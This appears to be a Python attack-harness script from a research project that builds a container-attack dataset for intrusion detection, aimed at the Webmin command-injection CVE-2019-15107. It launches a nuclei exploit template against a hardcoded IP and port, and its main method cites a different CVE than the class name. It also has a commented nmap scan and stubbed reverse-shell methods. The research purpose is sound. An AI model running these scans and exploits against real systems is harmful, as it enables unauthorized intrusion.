from attackerBase import *
from attackConfig import *



class OSCI_CVE_2019_15107_Attacker2(AttackerBase):
    
    def __init__(self):
        self.commandRunner = CommandRunner()

    def discovery(self) -> None:
        pass
        #self.commandRunner.runCommand("nmap -n -Pn -p 80,443,10000, 30001,30002, 30003 144.122.71.18")

    def main(self):
        print("Main method started")
        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30007 -t /home/vagrant/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/Scenario-I/UUF_CVE_2020_25213/Attacker2/CVE_2020_25213_Payload.yaml -debug')



    # Reverse shell will be handled later...
    def reverseShell(self):
        pass
        # init newTerminalThread
        # newTerminalThread -> Open terminal and run specific code ( it will wait) 

        # mainThread
        # Run another command1
        # Run another command2
        # Run another command3
        

    def reverseShell2(self):
        pass
        #self.commandRunner.runCommand("whoami")
       

#


if __name__ == '__main__':
    
    # Call your custom attacks here
    pass

  
# CWE-78
# CVE-2019-15107
# IP
# PORT
# IMAGE: vulhub/webmin:1.910  https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
# sudo docker run -it -p 10000:10000 -d  vulhub/webmin:1.910

# MAIN YAML PATH: ~/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-15107_Payload.yaml
# MAIN YAML AUTHOR: HALE
# MAIN YAML SOURCE: https://github.com/jas502n/CVE-2019-15107
